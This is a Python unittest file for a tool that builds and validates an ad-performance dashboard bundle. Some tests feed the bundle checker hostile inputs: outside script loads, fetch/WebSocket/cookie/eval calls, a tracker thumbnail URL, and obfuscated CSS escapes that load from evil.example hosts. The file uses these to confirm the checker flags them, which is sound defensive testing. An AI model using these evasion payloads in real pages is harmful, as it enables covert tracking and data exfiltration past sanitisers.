import csv
import datetime as dt
import errno
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "skills" / "creative-report" / "scripts"
sys.path.insert(0, str(SCRIPT))

import creative_metrics as cm  # noqa: E402
import dashboard  # noqa: E402
import panels  # noqa: E402
import report  # noqa: E402
from previews import Previews  # noqa: E402

EXAMPLE = ROOT / "examples" / "acme"
FIXTURE = EXAMPLE / "ads_daily.csv"
PROFILE = EXAMPLE / "brand-profile.md"


def run_json(skill, script):
    out = subprocess.run([sys.executable, str(ROOT / "skills" / skill / "scripts" / script), str(FIXTURE), "--profile", str(PROFILE), "--json"],
                         capture_output=True, text=True)
    assert out.returncode == 0, out.stderr
    return json.loads(out.stdout)


def build_mix_only(tmp, bundle):
    """The bundle of a run given only a creative-mix result: no ad data, so no key numbers, no ads and no verdicts."""
    mix = Path(tmp) / "mix-only.json"
    mix.write_text(json.dumps(run_json("creative-mix", "mix.py")))
    done = report.main(["--mix", str(mix), "-o", str(Path(tmp) / "mix-only.html"), "--claude-dashboard", str(bundle)])
    assert done == 0
    return bundle


def rows_of(bundle, dataset_id):
    return json.loads((Path(bundle) / "datasets" / ("%s.json" % dataset_id)).read_text(encoding="utf-8"))


class BundleTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls._tmp = tempfile.TemporaryDirectory()
        cls.tmp = Path(cls._tmp.name)
        cls.inputs = {"grade": run_json("creative-grader", "grade.py"), "verdicts": run_json("keep-or-kill", "verdicts.py"),
                      "mix": run_json("creative-mix", "mix.py")}
        for name, data in cls.inputs.items():
            (cls.tmp / ("%s.json" % name)).write_text(json.dumps(data))
        cls.args = [str(FIXTURE)] + [a for name in cls.inputs for a in ("--%s" % name, str(cls.tmp / ("%s.json" % name)))] + ["--profile", str(PROFILE)]
        cls.bundle = cls.tmp / "bundle"
        assert report.main(cls.args + ["-o", str(cls.tmp / "with.html"), "--claude-dashboard", str(cls.bundle)]) == 0
        cls.html, cls.ctx = cls.build()

    @classmethod
    def tearDownClass(cls):
        cls._tmp.cleanup()

    @classmethod
    def build(cls, **extra):
        rows = cm.load_rows(str(FIXTURE))
        kwargs = dict(rows=rows, grade=cls.inputs["grade"], verdicts=cls.inputs["verdicts"], mix=cls.inputs["mix"],
                      profile=PROFILE.read_text(encoding="utf-8"), currency="USD", generated="2026-01-02")
        kwargs.update(extra)
        return report.build_report(**kwargs)

    def copy(self):
        target = Path(tempfile.mkdtemp(dir=self._tmp.name))
        shutil.copytree(self.bundle, target / "b")
        return target / "b"

    def problems(self, bundle):
        return dashboard.check_bundle(str(bundle))

    # ---------- shape ----------

    def test_the_bundle_has_every_dataset_page_file_and_store_document_and_passes_its_check(self):
        manifest = json.loads((self.bundle / "manifest.json").read_text())
        self.assertEqual([d["id"] for d in manifest["datasets"]], [d for d, _, _ in dashboard.DATASETS])
        self.assertEqual(manifest["files"], ["index.html", "fonts.css", "dashboard.css", "dashboard.js"])
        self.assertEqual([s["doc"] for s in manifest["store"]], ["dash/meta", "files/index.html", "files/fonts.css", "files/dashboard.css", "files/dashboard.js"])
        self.assertEqual(manifest["title"], "Acme Outdoor Co. creative review")
        for entry in manifest["datasets"]:
            self.assertRegex(entry["id"], r"^[a-z0-9-]+$")
            self.assertTrue(2 <= len(entry["title"].split()) <= 5, entry["title"])
            self.assertEqual(entry["file"], "datasets/%s.json" % entry["id"])
            self.assertEqual(entry["format"], "json")
            rows = rows_of(self.bundle, entry["id"])
            self.assertIsInstance(rows, list)
            self.assertTrue(all(isinstance(r, dict) for r in rows))
        self.assertEqual(self.problems(self.bundle), [])
        self.assertEqual(report.main(["--check-dashboard", str(self.bundle)]), 0)

    def test_every_dataset_has_a_schema_entry_and_every_paired_note_column_exists(self):
        schema = dashboard.load_schema()
        self.assertEqual(set(schema["$defs"]), {d for d, _, _ in dashboard.DATASETS})
        for dataset_id, spec in schema["$defs"].items():
            columns = spec["items"]["properties"]
            for name, rule in columns.items():
                if rule.get("x-note"):
                    self.assertIn(rule["x-note"], columns, (dataset_id, name))
            for key in (spec["x-key"] or "").split(","):
                self.assertTrue(not key or key in columns, (dataset_id, key))
        self.assertIn({"fact": "Schema version", "value": str(schema["x-version"]), "tone": None}, rows_of(self.bundle, "header"))

    def test_the_page_has_one_kpi_tile_per_key_number_in_the_reports_order(self):
        page = (dashboard.PAGE / "index.html").read_text()
        self.assertEqual(re.findall(r'class="cr-kpi" data-metric="(\w+)"', page), [k for k, _, _ in panels.KPI_ORDER])

    def test_without_images_every_ad_says_why_it_has_none(self):
        media = rows_of(self.bundle, "ad-media")
        self.assertEqual(len(media), len(self.ctx.records))
        for row in media:
            self.assertIsNone(row["thumb"])
            self.assertEqual(row["thumb_note"], "n/a (no preview or thumbnail folder was passed)")
        self.assertTrue(all("thumb" not in r for r in rows_of(self.bundle, "verdicts")))
        images = next(r for r in rows_of(self.bundle, "header") if r["fact"] == "Ad images")
        self.assertEqual(images["value"], dashboard.THUMBS_NONE)

    # ---------- size limits ----------

    def test_images_ride_in_the_ad_media_when_they_fit_and_the_rest_say_why(self):
        thumbs = self.tmp / "thumbs"
        thumbs.mkdir(exist_ok=True)
        for ad in ("120000000001", "120000000002"):
            shutil.copy(EXAMPLE / "previews" / ("%s.png" % ad), thumbs / ("%s.png" % ad))
        _, ctx = self.build(previews=Previews(None, str(thumbs)))
        out = self.tmp / "thumbs-bundle"
        dashboard.write_bundle(ctx, str(out))
        media = rows_of(out, "ad-media")
        with_thumb = [r for r in media if r["thumb"]]
        self.assertEqual(sorted(r["ad_id"] for r in with_thumb), ["120000000001", "120000000002"])
        self.assertTrue(all(r["thumb"].startswith("data:image/png;base64,") and r["thumb_note"] is None for r in with_thumb))
        self.assertTrue(all(r["thumb_note"] == "n/a (no preview or thumbnail was supplied for this ad)" for r in media if not r["thumb"]))
        self.assertEqual(dashboard.check_bundle(str(out)), [])

    def test_images_past_the_budget_are_left_out_largest_spend_first_and_say_so(self):
        _, ctx = self.build(previews=Previews(str(EXAMPLE / "previews")))
        out = self.tmp / "budget-bundle"
        with mock.patch.object(dashboard, "MEDIA_BUDGET_KB", 48):
            dashboard.write_bundle(ctx, str(out))
        media = rows_of(out, "ad-media")
        kept = [bool(r["thumb"]) for r in media]
        self.assertTrue(any(kept) and not all(kept))
        self.assertEqual(kept, sorted(kept, reverse=True), "images go to the largest spend first")
        self.assertEqual([r["spend"] for r in media], sorted((r["spend"] for r in media), reverse=True))
        for row in media:
            if not row["thumb"]:
                self.assertEqual(row["thumb_note"], "n/a (thumbnail not included: the size limit for all images was reached)")
        images = next(r for r in rows_of(out, "header") if r["fact"] == "Ad images")
        self.assertEqual(images["value"], "Images for %d of %d ads." % (sum(kept), len(kept)))
        self.assertEqual(dashboard.check_bundle(str(out)), [])

    def test_an_image_over_the_one_image_limit_says_so(self):
        _, ctx = self.build(previews=Previews(str(EXAMPLE / "previews")))
        out = self.tmp / "one-image-bundle"
        with mock.patch.object(dashboard, "THUMB_MAX_KB", 1):
            dashboard.write_bundle(ctx, str(out))
        self.assertTrue(all(r["thumb"] is None and r["thumb_note"] == "n/a (thumbnail not included: over the size limit for one image)"
                            for r in rows_of(out, "ad-media")))

    def test_daily_series_past_the_file_limit_are_left_out_largest_spend_first_and_say_so(self):
        out = self.tmp / "series-bundle"
        with mock.patch.object(dashboard, "DATASET_MAX", 64 * 1024):
            dashboard.write_bundle(self.ctx, str(out))
        daily, media = rows_of(out, "ad-daily"), rows_of(out, "ad-media")
        carried = {r["ad_id"] for r in daily}
        self.assertTrue(carried and len(carried) < len(media))
        flags = [r["ad_id"] in carried for r in media]
        self.assertEqual(flags, sorted(flags, reverse=True), "series go to the largest spend first")
        for row in media:
            if row["ad_id"] in carried:
                self.assertEqual(row["series_days"], sum(1 for r in daily if r["ad_id"] == row["ad_id"]))
            else:
                self.assertIsNone(row["series_days"])
                self.assertEqual(row["series_days_note"], dashboard.SERIES_LEFT_OUT)
        self.assertLessEqual((out / "datasets" / "ad-daily.json").stat().st_size, 64 * 1024)

    # ---------- the same numbers as the HTML ----------

    def test_every_dataset_carries_what_the_html_path_computed(self):
        ctx, num = self.ctx, dashboard._num
        out = self.tmp / "parity"
        dashboard.write_bundle(ctx, str(out))
        tiles = panels.kpi_tiles(ctx)
        self.assertEqual([(r["metric"], r["value"], r["shown"]) for r in rows_of(out, "kpis")],
                         [(t["metric"], num(t["value"]), t["shown"]) for t in tiles])
        days, series = panels.time_series(ctx)
        daily = rows_of(out, "daily")
        self.assertEqual([(r["day"], r["metric"], r["value"], r["average"]) for r in daily[:len(days) * len(series)]],
                         [(d, s["key"], num(v), num(a)) for s in series for d, v, a in zip(days, s["values"], s["average"])])
        cal = panels.calendar(ctx.rows)
        extra = [key for key, _, _ in dashboard.EXTRA_DAILY]
        self.assertEqual([(r["metric"], r["value"]) for r in daily[len(days) * len(series):]],
                         [(key, num(v)) for key in extra for v in panels.day_values(cal, key)])
        info = panels.pareto_cut(ctx)
        self.assertEqual([(r["spend"], r["cum_spend_pct"], r["cum_basis_pct"], r["in_head"]) for r in rows_of(out, "pareto")],
                         [(num(a["spend"]), num(s), num(b), i < info["cut"]) for i, (a, s, b) in enumerate(zip(info["ranked"], info["cum_spend"], info["cum_basis"]))])
        self.assertEqual(rows_of(out, "pareto-cut")[0]["sentence"], panels.pareto_sentence(ctx, info))
        cells = panels.format_cells(ctx)
        self.assertEqual({(r["format"], k): r[k] for r in rows_of(out, "formats") for k, _ in panels.FORMAT_COLUMNS},
                         {(f, k): num(cells["cells"][f][k][0]) for f in cells["cells"] for k, _ in panels.FORMAT_COLUMNS})
        self.assertEqual([(r["number"], r["label"], r["why"]) for r in rows_of(out, "gaps")],
                         [(g["number"], g["label"], g["why"]) for g in panels.gap_rows(ctx)])
        self.assertEqual([r["title"] for r in rows_of(out, "briefing")], [s["title"] for s in panels._starters(ctx)])
        self.assertEqual([(r["fact"], r["value"]) for r in rows_of(out, "header")][1:6], ctx.header_facts)
        self.assertEqual([r["text"] for r in rows_of(out, "notes") if r["section"] == "method"], ctx.method_lines)
        self.assertEqual(sorted(r["ad_id"] for r in rows_of(out, "verdicts")), sorted(r["id"] for r in ctx.records))
        stake = {str(e["ad"]): e for e in self.inputs["verdicts"]["ads"]}
        for row in rows_of(out, "verdicts"):
            ad = ctx.ad_index[row["ad_id"]]
            self.assertEqual(row["roas"], num(ad.get("roas")))
            self.assertEqual(row["verdict"] is None, row["ad_id"] not in stake)
        board = {r["verdict_class"]: r["ads"] for r in rows_of(out, "verdict-board")}
        self.assertEqual(sum(board.values()), len(self.inputs["verdicts"]["ads"]))

    def test_the_html_is_the_same_with_and_without_the_bundle(self):
        plain = self.tmp / "without.html"
        self.assertEqual(report.main(self.args + ["-o", str(plain)]), 0)
        self.assertEqual(plain.read_bytes(), (self.tmp / "with.html").read_bytes())
        self.assertEqual(report.build_html(rows=cm.load_rows(str(FIXTURE)), generated="2026-01-02"),
                         report.build_report(rows=cm.load_rows(str(FIXTURE)), generated="2026-01-02")[0])

    # ---------- missing data ----------

    def test_a_missing_value_is_null_with_its_reason_never_zero(self):
        rows = cm.load_rows(str(FIXTURE))
        for row in rows:
            if row.get("ad_id") == "120000000005":
                row["conversion_value"] = None
        _, ctx = report.build_report(rows=rows, generated="2026-01-02")
        out = self.tmp / "missing"
        dashboard.write_bundle(ctx, str(out))
        pareto = {r["ad_id"]: r for r in rows_of(out, "pareto")}
        self.assertIsNone(pareto["120000000005"]["conversion_value"])
        self.assertEqual(pareto["120000000005"]["conversion_value_note"], "n/a (no purchase value recorded)")
        verdicts = {r["ad_id"]: r for r in rows_of(out, "verdicts")}
        self.assertIsNone(verdicts["120000000005"]["roas"])
        self.assertRegex(verdicts["120000000005"]["roas_note"], r"^n/a \(missing ")
        self.assertIsNone(verdicts["120000000005"]["verdict"])
        self.assertEqual(verdicts["120000000005"]["verdict_note"], "n/a (no keep-or-kill verdict for this ad)")
        kpis = {r["metric"]: r for r in rows_of(out, "kpis")}
        self.assertIsNone(kpis["reach"]["value"])
        self.assertEqual(kpis["reach"]["value_note"], dashboard.REACH_REASON)
        self.assertEqual(kpis["spend"]["change_pct_note"], "n/a (no prior period supplied)")
        schema = dashboard.load_schema()
        for dataset_id, _, _ in dashboard.DATASETS:
            columns = dashboard.schema_columns(schema, dataset_id)
            for row in rows_of(out, dataset_id):
                for name, rule in columns.items():
                    if rule.get("x-note"):
                        self.assertEqual(row[name] is None, bool(row[rule["x-note"]]), (dataset_id, name, row))
        self.assertEqual(dashboard.check_bundle(str(out)), [])

    def test_an_empty_panel_says_why_and_how(self):
        _, ctx = report.build_report(rows=cm.load_rows(str(FIXTURE)), generated="2026-01-02")
        out = self.tmp / "csv-only"
        dashboard.write_bundle(ctx, str(out))
        board = next(r for r in rows_of(out, "sections") if r["panel"] == "board")
        self.assertEqual(board["state"], "empty")
        self.assertIn("keep-or-kill verdicts were not supplied", board["why"])
        self.assertIn("Run the keep-or-kill skill", board["how"])
        self.assertEqual(rows_of(out, "verdict-board"), [])
        self.assertEqual(dashboard.check_bundle(str(out)), [])

    # ---------- the check: one negative case per failure class ----------

    def assertFlags(self, bundle, words):
        found = self.problems(bundle)
        self.assertTrue(any(words in p for p in found), "%r not in %s" % (words, found))

    def edit(self, bundle, path, old, new):
        target = bundle / path
        text = target.read_text()
        self.assertIn(old, text)
        target.write_text(text.replace(old, new, 1))

    def test_check_flags_a_malformed_manifest(self):
        b = self.copy()
        (b / "manifest.json").write_text("{not json")
        self.assertFlags(b, "manifest.json cannot be read")
        (b / "manifest.json").write_text(json.dumps({"title": "x", "datasets": {}}))
        self.assertFlags(b, "manifest needs a datasets list and a files list")

    def test_check_flags_a_dataset_that_does_not_parse_or_is_not_rows(self):
        b = self.copy()
        (b / "datasets" / "gaps.json").write_text("[{")
        self.assertFlags(b, "dataset gaps does not parse")
        (b / "datasets" / "gaps.json").write_text('{"rows": []}')
        self.assertFlags(b, "dataset gaps is not an array of row objects")

    def test_check_flags_an_oversize_dataset_and_a_bad_id(self):
        b = self.copy()
        with mock.patch.object(dashboard, "DATASET_MAX", 1024):
            self.assertFlags(b, "dataset daily is")
        manifest = json.loads((b / "manifest.json").read_text())
        manifest["datasets"][0]["id"] = "Header_1"
        (b / "manifest.json").write_text(json.dumps(manifest))
        self.assertFlags(b, "dataset id 'Header_1' is not lowercase letters, digits and hyphens")

    def test_check_flags_an_oversize_page_file(self):
        with mock.patch.object(dashboard, "DOC_MAX", 4 * 1024):
            self.assertFlags(self.bundle, "page file dashboard.js is")

    def test_check_flags_a_mark_naming_an_unknown_dataset_or_column(self):
        b = self.copy()
        self.edit(b, "files/index.html", 'data-source="pareto" data-row-key="ad_id"', 'data-source="ranking" data-row-key="ad_id"')
        self.assertFlags(b, "marks data-source 'ranking', which is not a dataset")
        b = self.copy()
        self.edit(b, "files/index.html", '<th data-field="label">Ad</th><th data-field="format">Format</th><th data-field="spend"',
                  '<th data-field="ad_label">Ad</th><th data-field="format">Format</th><th data-field="spend"')
        self.assertFlags(b, "marks field 'ad_label' on pareto, which has no such column")
        b = self.copy()
        self.edit(b, "files/index.html", 'data-where="fact=Window"', 'data-where="name=Window"')
        self.assertFlags(b, "marks field 'name' on header")

    def test_check_flags_a_number_written_into_the_markup(self):
        b = self.copy()
        self.edit(b, "files/index.html", "<h3 class=\"cr-h3\">Ads ranked by spend</h3>", "<h3 class=\"cr-h3\">Top 18 ads ranked by spend</h3>")
        self.assertFlags(b, "has the number 18 in its markup")

    def test_check_flags_scripts_and_styles_from_outside_the_bundle(self):
        b = self.copy()
        self.edit(b, "files/index.html", '<script src="dashboard.js"></script>', '<script src="https://cdn.example.com/x.js"></script>')
        self.assertFlags(b, "loads a script that is not a bundle file")
        b = self.copy()
        self.edit(b, "files/index.html", '<link rel="stylesheet" href="dashboard.css">', '<link rel="stylesheet" href="https://fonts.example.com/a.css">')
        self.assertFlags(b, "links to something that is not a bundle file")

    def test_check_flags_markup_written_from_script(self):
        for old, new in (("el.textContent = String(text);", "el.innerHTML = String(text);"),
                         (".text((f) => f);", ".html((f) => f);")):
            b = self.copy()
            self.edit(b, "files/dashboard.js", old, new)
            store = b / "store" / "files-dashboard.js.json"
            store.write_text(json.dumps({"text": (b / "files" / "dashboard.js").read_text()}))
            self.assertFlags(b, "writes markup from script")

    def test_check_flags_an_on_attribute(self):
        b = self.copy()
        self.edit(b, "files/index.html", '<nav class="cr-tabs" id="tabs"', '<nav class="cr-tabs" onclick="go()" id="tabs"')
        self.assertFlags(b, "has an on...= attribute")

    def test_check_flags_a_store_document_that_drifted_from_its_page_file(self):
        b = self.copy()
        self.edit(b, "files/dashboard.css", ".cr {", ".cr  {")
        self.assertFlags(b, "store document files/dashboard.css does not match files/dashboard.css")
        b = self.copy()
        (b / "store" / "dash-meta.json").write_text(json.dumps({"title": "Something else"}))
        self.assertFlags(b, "store document dash/meta does not carry the manifest title")
        with mock.patch.object(dashboard, "DOC_MAX", 4 * 1024):
            self.assertFlags(self.bundle, "store document files/dashboard.js is")

    # ---------- the schema: one negative case each ----------

    def mutate_rows(self, dataset_id, change):
        b = self.copy()
        rows = rows_of(b, dataset_id)
        change(rows)
        (b / "datasets" / ("%s.json" % dataset_id)).write_text(json.dumps(rows))
        return b

    def test_schema_flags_a_wrong_type(self):
        b = self.mutate_rows("pareto", lambda rows: rows[0].update(spend="9973.18"))
        self.assertFlags(b, "dataset pareto row 0 column spend is '9973.18', not number")

    def test_schema_flags_a_missing_required_column(self):
        b = self.mutate_rows("gaps", lambda rows: rows[0].pop("why"))
        self.assertFlags(b, "dataset gaps row 0 lacks the required column why")

    def test_schema_flags_a_null_without_its_note_and_a_zero_standing_in_for_missing(self):
        b = self.mutate_rows("kpis", lambda rows: rows[0].update(value=None))
        self.assertFlags(b, "dataset kpis row 0 column value is null but value_note is empty")
        reach = next(i for i, r in enumerate(rows_of(self.bundle, "kpis")) if r["metric"] == "reach")
        b = self.mutate_rows("kpis", lambda rows: rows[reach].update(value=0))
        self.assertFlags(b, "dataset kpis row %d column value is set but value_note is set" % reach)

    def test_schema_flags_an_unknown_column(self):
        b = self.mutate_rows("formats", lambda rows: rows[0].update(score=3))
        self.assertFlags(b, "dataset formats row 0 has a column the schema does not define: score")

    def test_schema_flags_a_bad_enum_date_and_note(self):
        b = self.mutate_rows("daily", lambda rows: rows[0].update(day="1 March"))
        self.assertFlags(b, "column day is not an ISO date")
        b = self.mutate_rows("notes", lambda rows: rows[0].update(section="footer"))
        self.assertFlags(b, "column section is 'footer', not one of")
        b = self.mutate_rows("pareto-cut", lambda rows: rows[0].update(concentration_pct=None, concentration_pct_note="unknown"))
        self.assertFlags(b, "column concentration_pct_note does not read like")

    def test_schema_flags_a_header_without_the_schema_version(self):
        b = self.mutate_rows("header", lambda rows: rows.pop())
        self.assertFlags(b, "dataset header does not carry schema version 2")

    def test_check_refuses_a_bundle_built_with_schema_version_one_and_says_to_rebuild(self):
        b = self.mutate_rows("header", lambda rows: next(r for r in rows if r["fact"] == "Schema version").update(value="1"))
        self.assertFlags(b, "this bundle was built with schema version 1 and this report.py reads version 2: build the bundle again")

    # ---------- review fixes: the check's gaps ----------

    def test_check_flags_a_manifest_that_leaves_out_datasets_or_the_page(self):
        b = self.copy()
        (b / "manifest.json").write_text(json.dumps({"title": "x", "datasets": [], "files": []}))
        self.assertFlags(b, "manifest has no dataset header, which the schema defines")
        self.assertFlags(b, "manifest files lack index.html")
        b = self.copy()
        manifest = json.loads((b / "manifest.json").read_text())
        manifest["datasets"].append(dict(manifest["datasets"][0], id="extra", file="datasets/extra.json"))
        (b / "manifest.json").write_text(json.dumps(manifest))
        self.assertFlags(b, "manifest lists dataset 'extra', which the schema does not define")
        b = self.copy()
        manifest = json.loads((b / "manifest.json").read_text())
        manifest["files"].remove("index.html")
        (b / "manifest.json").write_text(json.dumps(manifest))
        self.assertFlags(b, "manifest files lack index.html")

    def test_check_flags_a_number_the_datasets_do_not_hold(self):
        b = self.copy()
        self.edit(b, "files/index.html", '<h3 class="cr-h3">Ads ranked by spend</h3>', '<h3 class="cr-h3">Up 4242% on ads ranked by spend</h3>')
        self.assertFlags(b, "has the number 4242 in its markup")

    def test_check_flags_script_that_reaches_outside_the_page(self):
        for call in ("fetch('/x')", "new XMLHttpRequest()", "new WebSocket('wss://x')", "localStorage.setItem('a', 'b')",
                     "sessionStorage.getItem('a')", "document.coo" + "kie = 'a=b'", "eval('1')", "new Function('return 1')", "import('./m.js')"):
            b = self.copy()
            target = b / "files" / "dashboard.js"
            target.write_text(target.read_text() + "\n" + call + ";\n")
            self.assertFlags(b, "dashboard.js uses ")
        b = self.copy()
        target = b / "files" / "dashboard.js"
        target.write_text(target.read_text() + "\nconst spend = [12, 40, 7.5];\n")
        self.assertFlags(b, "dashboard.js has an array or object of number literals")
        b = self.copy()
        target = b / "files" / "dashboard.js"
        target.write_text(target.read_text() + "\n// we never call fetch( here, or use localStorage\n/* eval( */\n")
        self.assertFlags(b, "dashboard.js uses ")  # the source as written is checked too, so a stripping slip hides nothing

    def test_check_flags_script_in_the_page_that_reaches_outside(self):
        b = self.copy()
        self.edit(b, "files/index.html", '<script src="dashboard.js"></script>', '<script src="dashboard.js"></script><script>fetch("/x")</script>')
        self.assertFlags(b, "index.html uses fetch")

    def test_check_flags_styles_outside_the_pages_own_classes_and_urls_that_are_not_data(self):
        for rule in ("body { margin: 0; }", "h2, .cr-ok { color: red; }", ":root { --x: 1; }"):
            b = self.copy()
            target = b / "files" / "dashboard.css"
            target.write_text(target.read_text() + "\n" + rule + "\n")
            self.assertFlags(b, "dashboard.css styles ")
        b = self.copy()
        target = b / "files" / "dashboard.css"
        target.write_text(target.read_text() + "\n.cr-x { background: url(https://example.com/a.png); }\n")
        self.assertFlags(b, "dashboard.css loads https://example.com/a.png from a url()")
        b = self.copy()
        target = b / "files" / "dashboard.css"
        target.write_text(target.read_text() + "\n.cr-x { background: url(data:image/png;base64,AAAA); }\n")
        self.assertFalse([p for p in self.problems(b) if "from a url()" in p])
        b = self.copy()
        self.edit(b, "files/index.html", '<div class="cr" id="top">', '<div class="cr" id="top"><img src="https://example.com/a.png" alt="">')
        self.assertFlags(b, "index.html loads src that is not a bundle file or a data: URL")
        b = self.copy()
        self.edit(b, "files/index.html", '<link rel="stylesheet" href="dashboard.css">', '<link rel="stylesheet" href="dashboard.css"><style>body { margin: 0; }</style>')
        self.assertFlags(b, "index.html styles ")

    def test_check_flags_a_thumbnail_that_is_a_web_address(self):
        b = self.copy()
        target = b / "datasets" / "ad-media.json"
        rows = json.loads(target.read_text())
        rows[0]["thumb"] = "https://tracker.example/p.gif"
        target.write_text(json.dumps(rows))
        self.assertFlags(b, "dataset ad-media row 0 column thumb does not read like ^data:image/")

    def test_check_flags_an_outside_address_in_a_css_string_and_an_import_without_a_block(self):
        for rule, words in (('.cr-z{background-image:image-set("https://evil.example/b.png" 1x)}', "fonts.css names https://evil.example/b.png in a string"),
                            ('@import "x.css";', "fonts.css imports a stylesheet")):
            b = self.copy()
            target = b / "files" / "fonts.css"
            target.write_text(target.read_text() + "\n" + rule + "\n")
            self.assertFlags(b, words)

    def test_check_reads_css_as_a_browser_does_and_allows_only_raster_data_loads(self):
        payloads = (r".cr-a{background:u\72l(https://evil/x)}", r".cr-a{background:\75rl(https://evil/x)}",
                    r'.cr-a{background:image-set("\68ttps://evil/x" 1x)}', r'.cr-a{background:image-set("\000068ttps://evil/x" 1x)}',
                    r'.cr-a{background:image-set("/\/evil/x" 1x)}', r'.cr-a{background:image-set("\\\\evil/x" 1x)}',
                    r'.cr-a{background:image-set("ht\9tps://evil/x" 1x)}', ".cr-a{background:url(\x01https://evil/x)}",
                    r'.cr{content:"\""} .cr-a{background:image-set("https://evil/x" 1x)}', r'@\69mport "\68ttps://evil/x.css";',
                    '.cr-a{background:image-set("evil.png" 1x)}',
                    """.cr-a{background:url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><image href='https://evil/x'/></svg>")}""",
                    '.cr{content:"/*"} .cr-a{background:url(https://evil/x)} .cr{content:"*/"}',
                    '.cr-a{background:url(data:font/woff2;base64,AAAA)}',
                    r'.cr-x::after{content:"top \31 7"}', r"b\6f dy{margin:0}")
        for name in ("fonts.css", "dashboard.css"):
            for payload in payloads:
                if name == "fonts.css" and "font/woff2" in payload:
                    continue
                b = self.copy()
                target = b / "files" / name
                target.write_text(target.read_text() + "\n" + payload + "\n")
                self.assertTrue([p for p in self.problems(b) if p.startswith(name + " ")], "%s: %r passed the check" % (name, payload))
        for payload in ('.cr-x{background:image-set("data:image/webp;base64,AAAA" 1x, url(data:image/png;base64,AAAA) 2x)}',
                        r'.cr-x::after{content:"\""}'):
            b = self.copy()
            target = b / "files" / "dashboard.css"
            target.write_text(target.read_text() + "\n" + payload + "\n")
            self.assertFalse([p for p in self.problems(b) if p.startswith("dashboard.css ")], payload)

    def test_check_flags_store_documents_that_are_malformed(self):
        b = self.copy()
        (b / "store" / "dash-meta.json").write_text("{not json")
        self.assertFlags(b, "store document dash/meta does not parse")
        (b / "store" / "dash-meta.json").write_text("[1, 2]")
        self.assertFlags(b, "store document dash/meta is not an object")
        b = self.copy()
        manifest = json.loads((b / "manifest.json").read_text())
        manifest["store"].append("files/oops")
        (b / "manifest.json").write_text(json.dumps(manifest))
        self.assertFlags(b, "a store entry is not an object")

    def test_check_flags_a_field_with_no_data_source_and_reads_a_header_cell_from_its_own_table(self):
        b = self.copy()
        self.edit(b, "files/index.html", '<p class="cr-muted" id="images-note" data-source="header" data-field="value"',
                  '<p class="cr-muted" id="images-note" data-field="value"')
        self.assertFlags(b, "marks field 'value' with no data-source to read it from")
        b = self.copy()
        self.edit(b, "files/index.html", '<th data-field="format">Format</th><th data-field="verdict">Verdict</th>',
                  '<th data-field="rank" class="num">Rank</th><th data-field="verdict">Verdict</th>')
        self.assertFlags(b, "marks field 'rank' on verdicts, which has no such column")

    # ---------- review fixes: a failed write, missing values, the page ----------

    def test_a_failed_write_leaves_the_old_bundle_whole_and_no_scratch_behind(self):
        target = self.tmp / "keep"
        dashboard.write_bundle(self.ctx, str(target))
        before = {str(p.relative_to(target)): p.read_bytes() for p in target.rglob("*") if p.is_file()}
        _, other = report.build_report(rows=cm.load_rows(str(FIXTURE)), generated="2026-01-03")
        with mock.patch.object(dashboard, "page_text", side_effect=[OSError("disk full")]):
            with self.assertRaises(OSError):
                dashboard.write_bundle(other, str(target))
        after = {str(p.relative_to(target)): p.read_bytes() for p in target.rglob("*") if p.is_file()}
        self.assertEqual(before, after)
        self.assertEqual([p.name for p in self.tmp.iterdir() if p.name.startswith(".keep-")], [])
        self.assertEqual(dashboard.check_bundle(str(target)), [])

    def test_writing_a_bundle_leaves_other_files_in_the_folder_and_drops_stale_ones(self):
        target = self.tmp / "shared"
        (target / "files").mkdir(parents=True)
        (target / "files" / "old.js").write_text("stale")
        (target / "notes.txt").write_text("mine")
        dashboard.write_bundle(self.ctx, str(target))
        self.assertTrue((target / "notes.txt").is_file())
        self.assertFalse((target / "files" / "old.js").exists())
        self.assertEqual(dashboard.check_bundle(str(target)), [])

    def test_a_long_tail_ad_without_a_purchase_value_makes_the_tail_value_null_not_a_partial_sum(self):
        rows = cm.load_rows(str(FIXTURE))
        ranked = sorted(rows, key=lambda r: -(float(r.get("spend") or 0)))
        loser = ranked[-1]["ad_id"]
        for row in rows:
            if row["ad_id"] == loser:
                row["conversion_value"] = None
        _, ctx = report.build_report(rows=rows, generated="2026-01-02")
        out = self.tmp / "tail"
        dashboard.write_bundle(ctx, str(out))
        cut = rows_of(out, "pareto-cut")[0]
        self.assertIsNone(cut["tail_conversion_value"])
        self.assertRegex(cut["tail_conversion_value_note"], r"^n/a \(\d+ of \d+ long-tail ads have no purchase value recorded\)$")
        self.assertEqual(dashboard.check_bundle(str(out)), [])

    def test_a_verdict_group_with_an_ad_without_spend_has_a_null_stake_with_its_reason(self):
        verdicts = json.loads(json.dumps(self.inputs["verdicts"]))
        target = verdicts["ads"][0]
        target["spend_at_stake"] = target["spend"] = None
        _, ctx = report.build_report(rows=cm.load_rows(str(FIXTURE)), verdicts=verdicts, generated="2026-01-02")
        out = self.tmp / "stake"
        dashboard.write_bundle(ctx, str(out))
        board = rows_of(out, "verdict-board")
        unread = [r for r in board if r["spend_at_stake"] is None]
        self.assertEqual(len(unread), 1)
        self.assertRegex(unread[0]["spend_at_stake_note"], r"^n/a \(1 of \d+ ads have no spend recorded\)$")
        self.assertTrue(all(r["spend_at_stake_note"] is None for r in board if r["spend_at_stake"] is not None))
        self.assertEqual(dashboard.check_bundle(str(out)), [])

    def test_an_ad_without_a_verdict_has_null_confidence_age_and_fatigue_each_with_a_reason(self):
        _, ctx = report.build_report(rows=cm.load_rows(str(FIXTURE)), generated="2026-01-02")
        out = self.tmp / "no-verdicts"
        dashboard.write_bundle(ctx, str(out))
        row = rows_of(out, "verdicts")[0]
        self.assertIsNone(row["confidence"])
        self.assertEqual(row["confidence_note"], "n/a (no verdict supplied)")
        self.assertIsNone(row["fatiguing"])
        self.assertEqual(row["fatiguing_note"], "n/a (fatigue could not be read for this ad)")
        self.assertEqual(row["age_days"] is None, row["age_days_note"] is not None)
        self.assertEqual(dashboard.check_bundle(str(out)), [])

    def test_a_verdict_without_a_confidence_says_so(self):
        verdicts = json.loads(json.dumps(self.inputs["verdicts"]))
        verdicts["ads"][0]["confidence"] = None
        _, ctx = report.build_report(rows=cm.load_rows(str(FIXTURE)), verdicts=verdicts, generated="2026-01-02")
        out = self.tmp / "no-confidence"
        dashboard.write_bundle(ctx, str(out))
